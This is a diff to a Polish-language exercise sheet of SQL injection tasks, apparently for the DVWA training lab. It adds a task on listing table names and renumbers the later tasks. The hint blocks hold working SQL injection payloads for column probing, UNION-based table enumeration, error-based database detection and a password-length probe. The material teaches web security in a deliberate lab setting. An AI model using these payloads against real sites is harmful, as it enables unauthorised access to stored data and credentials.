@@ -42,6 +42,7 @@ Podpowiedź
 <details>
 1' ORDER BY 2-- -
 </details>
+
 # Zadanie 3
 
 Użyć UNION SELECT, aby pobrać dane z innej tabeli (users).
@@ -57,6 +58,20 @@ Podpowiedź
 
 # Zadanie 4
 
+Użyć UNION SELECT, aby sprawdzić nazwy tabeli w bazie danych
+
+## **Co powinno się stać** 
+W odpowiedzi z bazy zobaczysz nazwy tabel 
+
+Podpowiedź
+<details>
+  1' UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema='dvwa'-- -
+</details>
+
+# Zadanie 5
+
 Wykryć z jakiego systemu baz danych korzysta strona za pomocą error-based SQL Injection
 
 
@@ -68,7 +83,7 @@ Podpowiedź
 '
 </details>
 
-# Zadanie 5
+# Zadanie 6
 
 Sprawdzić długość hasła admina
 
@@ -81,7 +96,7 @@ Podpowiedź
 1' AND LENGTH(password)=32 -- -
 </details>
 
-# Zadanie 6
+# Zadanie 7
 
 Ominąć sanityzację wejścia 
 
